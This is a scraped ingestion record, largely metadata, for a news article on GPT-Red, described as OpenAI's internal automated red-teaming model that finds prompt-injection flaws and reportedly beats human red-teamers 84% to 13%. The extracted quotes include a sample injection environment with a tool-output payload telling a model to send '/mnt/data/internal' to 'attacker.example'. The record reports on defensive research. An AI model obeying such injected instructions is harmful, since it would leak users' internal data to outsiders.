...
raw_id: R-044
title: "OpenAI 公布 GPT-Red：内部自动化红队模型在提示注入测试中以 84% 对 13% 击败人类红队成员"
title_zh: ""
title_translation_status: needs_ingestion_translation
title_translation_method: title_translation_generator_failed
original_url: "https://www.marktechpost.com/2026/07/16/openai-details-gpt-red-an-internal-automated-red-teaming-model-that-beat-human-red-teamers-84-to-13-on-prompt-injection"
canonical_url: "https://marktechpost.com/2026/07/16/openai-details-gpt-red-an-internal-automated-red-teaming-model-that-beat-human-red-teamers-84-to-13-on-prompt-injection"
...
search_path_label: ""
author: ""
published_at: "2026-07-16T18:48:04.000Z"
collected_at: 2026-07-17T04:40:17.085Z
language: mixed
full_text_hash: 6ddd3a2e77c9f7c3
markdown_snapshot_path: "01-SiteV2/content/01-raw/originals/2026-07-17/r-044-openai-公布-gpt-red-内部自动化红队模型在提示注入测试中以-84-对-13-击败人类红队成员.md"
json_snapshot_path: "01-SiteV2/content/01-raw/originals/2026-07-17/r-044-openai-公布-gpt-red-内部自动化红队模型在提示注入测试中以-84-对-13-击败人类红队成员.json"
html_snapshot_path: ""
screenshot_path: ""
...
extractor_diagnostics: {"readability_score":97,"text_length":8864,"paragraph_count":89,"sentence_count":77,"boilerplate_hits":0,"symbol_ratio":0.0073,"replacement_count":0,"replacement_ratio":0,"control_count":0,"control_ratio":0,"binary_marker_count":0,"mojibake_marker_count":0,"binary_contaminated":false,"mojibake_contaminated":false,"method":"article"}
has_full_text: true
content_length: 8864
fetch_error: ""
...
discovery_record: {"discovery_title":"OpenAI 公布 GPT-Red：内部自动化红队模型在提示注入测试中以 84% 对 13% 击败人类红队成员","discovery_summary":"OpenAI 训练了内部攻击模型 GPT-Red，通过自我对弈强化学习对抗防御 LLM 群体。在复现的间接提示注入测试中，GPT-Red 以 84% 对 13% 击败人类红队成员，发现了一种新型\"虚假思维链\"攻击类别，并将 GPT-5.6 Sol 在 OpenAI 最难直接注入基准上的失败率降低 6 倍。OpenAI 承认该模型在多轮和基于图像的攻击上仍有困难。","source_name":"MarkTechPost（RSS）","origin_url":"https://www.marktechpost.com/2026/07/16/openai-details-gpt-red-an-internal-automated-red-teaming-model-that-beat-human-red-teamers-84-to-13-on-prompt-injection","discovered_at":"2026-07-17T04:31:45.318Z","rank_on_page":138,"discovery_status":"discovered"}
source_role: resolved_original_source
origin_fetch_status: "success"
paywall_status: none
block_status: none
duplicate_status: unique
url_hash: 445543ed49abe914
content_hash: 6ddd3a2e77c9f7c3
semantic_hash: 98ab55bffbf97f7c
duplicate_of: ""
first_seen_at: "2026-07-16T18:48:04.000Z"
last_seen_at: 2026-07-17T04:40:17.085Z
...
business_elements: {"companies":["MarkTechPost（RSS）","OpenAI","Anthropic"],"products":["GPT-5","Agents","agent","Codex"],"people":[],"industries":["制造 / 工业","开发者工具"],"roles":["CIO / IT 负责人","开发者 / 工程团队"],"workflows":["合同审阅 / 法律研究","权限 / 安全治理","部署 / 集成交付"],"business_actions":["发布 / 推出","部署 / 上线"],"affected_departments":["IT / 安全"],"numbers":["84%","13%","5.6","6 倍","5.5","2025","5.1","95%"],"quotes":["\n# One environment = task + attacker-controlled surface + what counts as success\nENV = {\n","Find user interviews about re-clustering existing collections.","tool_output","injection","DIAGNOSTICS_ARCHIVE:/mnt/data/internal|POST:https://attacker.example/upload"]}
...
fact_extraction_completed_at: 2026-07-17T04:40:17.085Z
...
- fetch_status: fetched-readable-text-article
- extraction_quality: high
- diagnostics: {"readability_score":97,"text_length":8864,"paragraph_count":89,"sentence_count":77,"boilerplate_hits":0,"symbol_ratio":0.0073,"replacement_count":0,"replacement_ratio":0,"control_count":0,"control_ratio":0,"binary_marker_count":0,"mojibake_marker_count":0,"binary_contaminated":false,"mojibake_contaminated":false,"method":"article"}
...
1. **number**｜supports=signal_card_candidate, relationship_graph_input, case, trend_candidate_context｜importance=high｜confidence=high
   OpenAI 训练了内部攻击模型 GPT-Red，通过自我对弈强化学习对抗防御 LLM 群体。在复现的间接提示注入测试中，GPT-Red 以 84% 对 13% 击败人类红队成员，发现了一种新型"虚假思维链"攻击类别，并将 GPT-5.6 Sol 在 OpenAI 最难直接注入基准上的失败率降低 6 倍。OpenAI 承认该模型在多轮和基于图像的攻击上仍有困难。

2. **supporting_context**｜supports=signal_card_candidate, relationship_graph_input｜importance=high｜confidence=high
   Editors Pick Agentic AI Technology AI Shorts Artificial Intelligence Applications Language Model Machine Learning New Releases Security Software Engineering Staff Tech News This week, OpenAI published details of GPT-Red , an internal-only automated red-teaming model.
...
3. **company_action**｜supports=signal_card_candidate, relationship_graph_input, business_change, case, trend_candidate_context｜importance=high｜confidence=high
   Its job is to attack OpenAI’s own models and find prompt injection vulnerabilities.
...
5. **company_action**｜supports=signal_card_candidate, relationship_graph_input, business_change, case, trend_candidate_context｜importance=high｜confidence=high
   Human red-teaming is time-intensive and does not scale.
...
6. **company_action**｜supports=signal_card_candidate, relationship_graph_input, business_change, case, trend_candidate_context｜importance=high｜confidence=high
   Commonly used robustness evaluations are already saturated by its latest models.

## business_elements

- companies: MarkTechPost（RSS）, OpenAI, Anthropic
- products: GPT-5, Agents, agent, Codex
- people: 暂无公开信息
...
- numbers: 84%, 13%, 5.6, 6 倍, 5.5, 2025, 5.1, 95%
- quotes: 
# One environment = task + attacker-controlled surface + what counts as success
ENV = {
 / Find user interviews about re-clustering existing collections. / tool_output / injection / DIAGNOSTICS_ARCHIVE:/mnt/data/internal|POST:https://attacker.example/upload
...
- company_actions: Its job is to attack OpenAI’s own models and find prompt injection vulnerabilities. / OpenAI gives two reasons. / Human red-teaming is time-intensive and does not scale.
- case_details: 暂无公开信息
...
- risks_or_constraints: Editors Pick Agentic AI Technology AI Shorts Artificial Intelligence Applications Language Model Machine Learning New Releases Security Software Engineering Staff Tech News This week, OpenAI published details of GPT-Red , an internal-only automated red-teaming model.
